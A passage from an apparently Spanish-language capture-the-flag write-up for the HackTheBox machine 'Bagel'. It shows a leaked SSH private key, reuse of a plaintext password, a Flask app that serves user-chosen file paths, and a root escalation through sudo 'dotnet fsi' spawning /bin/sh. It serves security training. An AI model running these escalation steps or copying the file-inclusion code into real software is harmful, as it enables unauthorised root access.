Pn6CTk0VsD5oLVUYjfZ0ipmfIb1rCXL410V7H1DNeUJeg4hFjzxQnRUiWb2Wmwjx5efeOR
O1eDvHML3/X4WivARfd7XMZZyfB3JNJbynVRZPr/DEJ/owKRDSjbzem81TiO4Zh06OiiqS
+itCwDdFq4RvAF+YlK9Mmit3/QbMVTsL7GodRAvRzsf1dFB+Ot+tNMU73Uy1hzIi06J57P
WRATokDV/Ta7gYeuGJfjdb5cu61oTKbXdUV9WtyBhk1IjJ9l0Bit/mQyTRmJ5KH+CtAAAA
wFpnmvzlvR+gubfmAhybWapfAn5+3yTDjcLSMdYmTcjoBOgC4lsgGYGd7GsuIMgowwrGDJ
vE1yAS1vCest9D51grY4uLtjJ65KQ249fwbsOMJKZ8xppWE3jPxBWmHHUok8VXx2jL0B6n
xQWmaLh5egc0gyZQhOmhO/5g/WwzTpLcfD093V6eMevWDCirXrsQqyIenEA1WN1Dcn+V7r
DyLjljQtfPG6wXinfmb18qP3e9NT9MR8SKgl/sRiEf8f19CAAAAMEA/8ZJy69MY0fvLDHT
WhI0LFnIVoBab3r3Ys5o4RzacsHPvVeUuwJwqCT/IpIp7pVxWwS5mXiFFVtiwjeHqpsNZK
EU1QTQZ5ydok7yi57xYLxsprUcrH1a4/x4KjD1Y9ijCM24DknenyjrB0l2DsKbBBUT42Rb
zHYDsq2CatGezy1fx4EGFoBQ5nEl7LNcdGBhqnssQsmtB/Bsx94LCZQcsIBkIHXB8fraNm
iOExHKnkuSVqEBwWi5A2UPft+avpJfAAAAwQC6PBf90h7mG/zECXFPQVIPj1uKrwRb6V9g
GDCXgqXxMqTaZd348xEnKLkUnOrFbk3RzDBcw49GXaQlPPSM4z05AMJzixi0xO25XO/Zp2
iH8ESvo55GCvDQXTH6if7dSVHtmf5MSbM5YqlXw2BlL/yqT+DmBsuADQYU19aO9LWUIhJj
eHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4K
nrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=
-----END OPENSSH PRIVATE KEY-----

```

## Shell phil

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa phil@10.10.11.201
Last login: Tue Feb 14 11:47:33 2023 from 10.10.14.19
[phil@bagel ~]$ export TERM=xterm
[phil@bagel ~]$ whoami
phil
[phil@bagel ~]$ 
```

Bueno si recordamos tenemos una contraseña que habíamos visto con `dnSpy` igual nos puede servir `k8wdAYYKyhnjg3K`

## User flag 

```bash
[phil@bagel ~]$ cat user.txt 
ea6bd689c9e206e831251efe8a82fdf1
[phil@bagel ~]$ 
```

## Escalada de privilegios

Vemos que no podemos entrar a su directorio y si probamos la contraseña es correcta

```bash
[phil@bagel home]$ ls -l
total 8
drwx------. 5 developer developer 4096 Jan 20 14:16 developer
drwx------. 4 phil      phil      4096 Jan 20 14:14 phil
[phil@bagel home]$ 
[phil@bagel home]$ su developer
Password: 
[developer@bagel home]$ whoami
developer
[developer@bagel home]$ 

```

## Código para entender todo 

Bueno podemos ver el código de como se esta empleando todo por detrás es el mismo que pudimos ver cuando nos aprovechamos el `LFI`

```bash
[developer@bagel app]$ cat app.py 
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

Bueno también gracias a que nos dieron el **dll** mediante el **LFI** pudimos aprovecharnos de explotar todo 

Si hacemos un `sudo -l` podemos ejecutar como **root** sin proporcionar contraseña esto

```bash
[developer@bagel ~]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
[developer@bagel ~]$ 

```

<https://gtfobins.github.io/gtfobins/dotnet/#sudo>

![](/assets/images/htb-writeup-bagel/web9.png)

Bueno si seguimos los pasos podemos tanto leer archivos como ser root directamente así que yo prefiero convertirme en root y funciona 

```bash
[developer@bagel ~]$ sudo /usr/bin/dotnet fsi

Welcome to .NET 6.0!
---------------------
SDK Version: 6.0.113

----------------
Installed an ASP.NET Core HTTPS development certificate.
To trust the certificate run 'dotnet dev-certs https --trust' (Windows and macOS only).
Learn about HTTPS: https://aka.ms/dotnet-https
----------------
Write your first app: https://aka.ms/dotnet-hello-world
Find out what's new: https://aka.ms/dotnet-whats-new
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli
--------------------------------------------------------------------------------------

Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

> System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
sh-5.2# whoami
root
sh-5.2# 
```

```bash
sh-5.2# bash
[root@bagel developer]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@bagel developer]# 
```

## Root flag 

```bash
[root@bagel ~]# ls
anaconda-ks.cfg  bagel  root.txt
[root@bagel ~]# cat root.txt 
f06db05f53e3b11971d2b9e341b4396f
[root@bagel ~]# 
```

![](/assets/images/htb-writeup-bagel/final.png)
